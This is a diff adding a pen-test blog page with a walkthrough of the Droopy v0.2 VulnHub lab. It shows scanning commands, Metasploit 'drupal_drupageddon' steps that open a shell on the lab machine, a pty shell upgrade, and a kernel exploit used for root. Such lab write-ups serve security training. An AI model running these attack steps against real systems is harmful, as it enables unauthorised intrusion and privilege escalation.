@@ -1,0 +1,263 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>Droopy:V0.2  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+Nikto
+Metasploit
+* Vulnerabilities: Drupal HTTP Parameter Key/Value SQL Injection
+Linux Kernel 3.13.0 &lt; 3.19 &lsquo; &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Droopy:V0.2</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Metasploit
+*</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/34992/">Drupal HTTP Parameter Key/Value SQL Injection</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/drooy2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.155 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.155 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.155</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>No useful info come out.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>still same thing.</p>
+
+<p>check the <a href="http://192.168.41.155">http://192.168.41.155</a></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Find the target use <code>Drupal</code></p>
+
+<p>in msfconsole, search drupal, find an interesting exploit <code>exploit/multi/http/drupal_drupageddon</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/drupal_drupageddon
+</span><span class='line'>msf exploit(drupal_drupageddon) &gt; set rhost 192.168.41.155
+</span><span class='line'>msf exploit(drupal_drupageddon) &gt; exploit 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get meterpreter, do command <code>shell</code> to get shell.</p>
+
+<p>use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> get bash</p>
+
+<p>user is www-data, next try to get root</p>
+
+<p><code>uname -a</code></p>
+
+<p><code>Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></p>
+
+<p>the kernel is 3.1.30</p>
+
+<p><code>searchsploit 3.1.30</code></p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>upload the exploit, compile and run it, get the root:</p>
+
+<p><img src="/images/blog/vulhub/drooy2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-08-01T10:57:14-05:00" pubdate data-updated="true">2016-08-01 10:57:14 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/drupal/'>drupal</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2016
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
